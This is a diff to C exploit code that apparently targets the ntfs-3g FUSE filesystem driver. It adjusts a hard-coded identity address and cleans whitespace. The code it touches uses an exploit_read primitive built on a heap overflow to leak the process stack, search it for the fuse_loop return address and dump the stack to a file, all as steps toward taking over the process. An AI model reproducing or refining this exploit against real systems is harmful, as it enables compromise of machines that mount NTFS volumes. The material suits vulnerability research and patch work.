@@ -34,7 +34,7 @@ char *paths[] = {
 // Which attribute offset will be correct depends on which address we'll get during heap allocation
 // If it's correct we can switch to another file with a different attribute offset
 // 0x4064b4
-#define ADDR_IDENT 0x4064b4
+#define ADDR_IDENT 0x418a00
 
 // Offset to a mount_dst string pointer
 // It's stored in ntfs-3g data section (which address is static) and points to the
@@ -209,31 +209,31 @@ int main()
 
     uint32_t stack_top;
     stack_top = (mnt_dst_ptr | 0xfff) + 1;
-    printf("stack_top: %llx\n", stack_top);   
+    printf("stack_top: %llx\n", stack_top);
 
     // Read stack to get find the address of return ptr from fuse_loop
     uint32_t stack_to_read = 0x2000;
     unsigned char* stack = malloc(stack_to_read);
-    
+
     uint32_t deadzone = (-OFFSET_OVERFLOW) & 0xfff;
-    
+
     uint32_t zone_base = stack_top - stack_to_read - deadzone - 4;
 
     printf("\n");
     printf("Reading stack from %llx, (deadzone: %llx):\n", zone_base, deadzone);
     int read_amount = exploit_read(fd, stack, stack_to_read, zone_base);
-    
+
     printf("read %d bytes\n", read_amount);
 
     void* ret_ptr_abs = memmem(stack, stack_to_read, FUSE_LOOP_RET_ADDR, 4);
-    
+
     if (ret_ptr_abs == NULL) {
         printf("Miss\n");
     } else {
         unsigned char * ptr = (unsigned char *) ret_ptr_abs;
         printf("Hit at %llx\n", zone_base + (ptr - stack));
     }
-    
+
     int stack_fd = open("stack_dump.bin", O_RDWR | O_DIRECT | O_CREAT);
     pwrite(stack_fd, stack, read_amount, 0);
     close(stack_fd);
